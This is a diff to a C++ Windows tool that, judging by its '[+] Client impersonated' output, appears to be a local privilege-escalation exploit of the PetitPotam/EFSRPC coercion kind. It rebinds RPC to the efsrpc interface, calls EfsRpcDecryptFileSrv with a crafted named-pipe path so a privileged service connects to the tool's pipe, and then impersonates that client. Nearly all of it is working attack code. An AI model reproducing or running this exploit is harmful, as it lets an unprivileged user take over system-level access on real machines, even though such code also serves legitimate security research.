@@ -12,6 +12,7 @@
 #include <UserEnv.h>
 
 #include <format>
+#include <functional>
 #include <iostream>
 #include <memory>
 #include <string>
@@ -29,6 +30,7 @@
 * 
 * The necessary types from "ms-dtyp.h" were moved to "ms-efsr.h".
 * Structs in "ms-efsr.h" were renamed to avoid redefinition errors.
+* GUID changed from "c681d488-d850-11d0-8c52-00c04fd90f7e" (lsarpc) to df1941c5-fe89-4e79-bf10-463657acf44d (efsrpc).
 * 32-bit: "MIDL_user_allocate" defined as wrapper around "malloc". "MIDL_user_free" defined as wrapper around "free".
 * 64-bit: "MIDL_user_allocate" set to "malloc" and "MIDL_user_free" set to "free".
 */
@@ -37,10 +39,14 @@
 #pragma warning(disable: 6031)
 #pragma warning(disable: 6387)
 
+#define WSTR_TO_RPC_STR(str) reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(str))
+
 // Types for RAII
 template <typename T, auto deleter>
 using unique_ptr_del = std::unique_ptr<T, std::integral_constant<decltype(deleter), deleter>>;
 using unique_handle = unique_ptr_del<std::remove_pointer<HANDLE>::type, &CloseHandle>;
+static void RpcBindingFreeFixed(RPC_BINDING_HANDLE handle) { RpcBindingFree(&handle); };
+using unique_binding = unique_ptr_del<std::remove_pointer<RPC_BINDING_HANDLE>::type, &RpcBindingFreeFixed>;
 
 constexpr DWORD MAX_NAME_LENGTH = 256;
 
@@ -129,74 +135,38 @@ static unique_handle start_named_pipe_listener(HANDLE pipe, OVERLAPPED& ol)
 	return event_managed;
 }
 
+static unique_binding create_rpc_binding()
+{
+	// Attempt to create a binding using the endpoint mapper
+	RPC_BINDING_HANDLE binding_handle;
+	RpcBindingFromStringBindingW(WSTR_TO_RPC_STR(L"ncalrpc:"), &binding_handle);
+	if (RpcEpResolveBinding(binding_handle, efsrpc_v1_0_c_ifspec) == RPC_S_OK)
+	{
+		return unique_binding(binding_handle);
+	}
+
+	// Attempt to create a binding using a well-known endpoint (for older versions of Windows)
+	RpcBindingFromStringBindingW(WSTR_TO_RPC_STR(L"ncalrpc:[efslrpc]"), &binding_handle);
+	if (RpcEpResolveBinding(binding_handle, efsrpc_v1_0_c_ifspec) == RPC_S_OK)
+	{
+		return unique_binding(binding_handle);
+	}
+
+	return NULL;
+}
+
 // Separate function for the RPC stuff requiring SEH
-static bool call_rpc(RPC_BINDING_HANDLE binding_handle, wchar_t* pipe_name)
+static void call_rpc(RPC_BINDING_HANDLE binding_handle, wchar_t* pipe_name)
 {
 	RpcTryExcept
 	{
-		EfsRpcEncryptFileSrv(binding_handle, pipe_name);
+		EfsRpcDecryptFileSrv(binding_handle, pipe_name, 0);  // EfsRpcEncryptFileSrv doesn't seem to work on Windows 10 Home (?)
 	}
 	RpcExcept(TRUE)
 	{
-		// We should always end up here with RPC_S_CALL_CANCELLED due to the timeout
-		if (RpcExceptionCode() != RPC_S_CALL_CANCELLED)
-		{
-			return false;
-		}
+		// Ignore RPC exceptions
 	}
 	RpcEndExcept
-	return true;
-}
-
-static bool trigger_callback(const std::wstring& pipe_name)
-{
-	// Create string binding
-	RPC_WSTR string_binding;
-	if (RpcStringBindingComposeW(
-		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"c681d488-d850-11d0-8c52-00c04fd90f7e")),
-		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"ncacn_np")),
-		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"localhost")),
-		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"\\pipe\\lsarpc")),
-		NULL,
-		&string_binding) != RPC_S_OK)
-	{
-		return false;
-	}
-	unique_ptr_del<RPC_WSTR, &RpcStringFreeW> string_binding_managed(&string_binding);
-
-	// Create actual binding
-	RPC_BINDING_HANDLE binding_handle;
-	if (RpcBindingFromStringBindingW(string_binding, &binding_handle) != RPC_S_OK)
-	{
-		return false;
-	}
-	unique_ptr_del<RPC_BINDING_HANDLE, &RpcBindingFree> binding_handle_managed(&binding_handle);
-
-	// Set auth info
-	if (RpcBindingSetAuthInfoW(
-		binding_handle,
-		reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"localhost")),
-		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-		RPC_C_AUTHN_WINNT,
-		NULL,
-		RPC_C_AUTHZ_NONE) != RPC_S_OK)
-	{
-		return false;
-	}
-
-	// Set timeout to make the RPC call return immediately
-	if (RpcBindingSetOption(binding_handle, RPC_C_OPT_CALL_TIMEOUT, 1) != RPC_S_OK)
-	{
-		return false;
-	}
-
-	// Trigger callback
-	if (!call_rpc(binding_handle, const_cast<wchar_t*>(pipe_name.c_str())))
-	{
-		return false;
-	}
-
-	return true;
 }
 
 static std::wstring get_current_user()
@@ -348,18 +318,27 @@ int wmain(int argc, wchar_t* argv[])
 	}
 	output(L"[+] Listener started.");
 
+	// Create RPC binding
+	output(L"[*] Creating RPC binding...");
+	auto binding = create_rpc_binding();
+	if (!binding)
+	{
+		output(L"[-] Failed to create binding :(");
+	}
+	output(L"[+] Binding created.");
+
 	// Trigger callback
 	output(L"[*] Triggering callback...");
-	if (!trigger_callback(L"\\\\localhost/pipe/" + uuid + L"\\.\\"))  // Not sure why this works...
-	{
-		output(L"[-] Callback failed :(");
-		return 0;
-	}
-	output(L"[+] Callback triggered.");
+	auto pipe_trigger = L"\\\\localhost/pipe/" + uuid + L"\\.\\";  // Not sure why this works...
+	auto trigger_thread = std::thread(&call_rpc, binding.get(), const_cast<wchar_t*>(pipe_trigger.c_str()));
+	std::unique_ptr<void, std::function<void(void*)>> thread_scope_guard(reinterpret_cast<void*>(-1), [&](void*) {
+		pipe_managed.reset();  // RPC call won't return until pipe is closed
+		trigger_thread.join();
+	});
 
 	// Wait for client to connect
 	output(L"[*] Waiting for connection...");
-	if (WaitForSingleObject(event.get(), 1000) != WAIT_OBJECT_0)
+	if (WaitForSingleObject(event.get(), 5000) != WAIT_OBJECT_0)
 	{
 		output(L"[-] No connection received :(");
 		return 0;
@@ -374,6 +353,9 @@ int wmain(int argc, wchar_t* argv[])
 		return 0;
 	}
 	output(L"[+] Client impersonated.");
+
+	// Close pipe and wait for RPC call to finish
+	thread_scope_guard.reset();
 
 	// Get username of impersonated user
 	output(L"[*] Looking up username of impersonated user...");
